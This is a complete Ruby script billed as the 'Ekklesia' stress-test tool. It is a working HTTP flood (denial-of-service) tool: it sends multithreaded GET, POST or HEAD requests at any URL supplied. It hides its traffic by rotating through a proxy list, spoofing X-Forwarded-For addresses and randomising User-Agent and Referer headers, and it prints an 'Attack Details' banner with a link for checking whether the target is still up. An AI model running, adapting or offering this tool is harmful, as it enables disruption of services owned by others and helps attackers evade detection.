require 'net/http'
require 'uri'
require 'optparse'
require 'thread'

# ANSI color codes for styling
def green_bold(text)
  "\e[1;32m#{text}\e[0m" # Bold green
end

# Display the initial banner
def banner
  puts green_bold("===========================================")
  puts green_bold("          Ekklesia - Stress-Test Tool       ")
  puts green_bold("      Created by TheCybercoach              ")
  puts green_bold("      Email: thecybercoach971@gmail.com     ")
  puts green_bold("===========================================")
end

# Display attack details banner
def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, delay)
  status_check_url = "https://check-host.net/check-ping?host=#{url}"

  puts green_bold("===========================================")
  puts green_bold("           Ekklesia - Attack Details        ")
  puts green_bold("===========================================")
  puts green_bold("Tool:       Ekklesia")
  puts green_bold("Author:     TheCybercoach")
  puts green_bold("Email:      thecybercoach971@gmail.com")
  puts green_bold("Target:     #{url}")
  puts green_bold("Threads:    #{threads}")
  puts green_bold("Requests:   #{requests_per_thread} per thread")
  puts green_bold("Proxy:      #{proxy_enabled ? 'Yes' : 'No'}")
  puts green_bold("Method:     #{method}")
  puts green_bold("Delay:      #{delay}ms between requests")
  puts green_bold("Check Status: #{status_check_url}")
  puts green_bold("===========================================")
end

# Send requests with randomized headers
def send_request(url, method, proxy = nil, headers = {})
  uri = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == "https")

  if proxy
    proxy = "http://#{proxy}" unless proxy.start_with?("http://", "https://")
    proxy_uri = URI.parse(proxy)
    http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
  end

  begin
    request = case method.upcase
              when "GET"
                Net::HTTP::Get.new(uri.request_uri, headers)
              when "POST"
                Net::HTTP::Post.new(uri.request_uri, headers).tap { |r| r.set_form_data({ key: "value" }) }
              when "HEAD"
                Net::HTTP::Head.new(uri.request_uri, headers)
              else
                raise "[!] Unsupported HTTP method: #{method}"
              end

    response = http.request(request)
    puts "[+] Request sent via #{proxy || 'direct connection'} - Response: #{response.code}"
    return response.code.to_i
  rescue => e
    puts "[!] Error: #{e.message}"
    return 0
  end
end

# Generate randomized headers
def generate_headers
  {
    "User-Agent" => "Mozilla/#{rand(5..10)}.0 (Windows NT #{rand(6..10)}.#{rand(0..3)}) Gecko/#{rand(20100101..20221231)} Firefox/#{rand(50..100)}",
    "X-Forwarded-For" => "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}",
    "Referer" => "https://google.com/search?q=#{rand(1000)}"
  }
end

# Perform the stress test
def stress_test(url, threads, requests_per_thread, proxies, method, delay)
  thread_pool = []

  threads.times do
    thread_pool << Thread.new do
      # Each thread gets its own proxy cycle
      proxies_cycle = proxies.cycle if proxies.any?

      requests_per_thread.times do
        proxy = proxies.any? ? proxies_cycle.next : nil
        headers = generate_headers
        send_request(url, method, proxy, headers)
        sleep(delay / 1000.0) # Convert delay from ms to seconds
      end
    end
  end

  thread_pool.each(&:join)
  puts "[+] Stress test completed."
end

# Parse command-line options
options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ruby ekklesia.rb [options]"

  opts.on("-u", "--url URL", "Target URL") do |url|
    options[:url] = url
  end

  opts.on("-t", "--threads THREADS", Integer, "Number of threads (default: 10)") do |threads|
    options[:threads] = threads
  end

  opts.on("-r", "--requests REQUESTS", Integer, "Number of requests per thread (default: 100)") do |requests|
    options[:requests] = requests
  end

  opts.on("-p", "--proxy PROXY_FILE", "Path to proxy list file") do |proxy_file|
    options[:proxy_file] = proxy_file
  end

  opts.on("-m", "--method METHOD", "HTTP method to use (GET, POST, HEAD, etc.)") do |method|
    options[:method] = method
  end

  opts.on("-d", "--delay DELAY", Integer, "Delay between requests in milliseconds (default: 100)") do |delay|
    options[:delay] = delay
  end
end.parse!

# Validate input
if options[:url].nil?
  puts "[!] Error: Target URL is required."
  exit
end

url = options[:url]
threads = options[:threads] || 10
requests_per_thread = options[:requests] || 100
proxy_file = options[:proxy_file]
method = options[:method] || "GET"
delay = options[:delay] || 100

# Load proxies if provided
proxies = []
proxy_enabled = false
if proxy_file
  begin
    proxies = File.readlines(proxy_file).map(&:strip)
    proxy_enabled = true
    puts "[+] Loaded #{proxies.size} proxies from #{proxy_file}"
  rescue Errno::ENOENT
    puts "[!] Error: Proxy file not found."
    exit
  end
end

# Main script logic
banner
attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, delay)
stress_test(url, threads, requests_per_thread, proxies, method, delay)
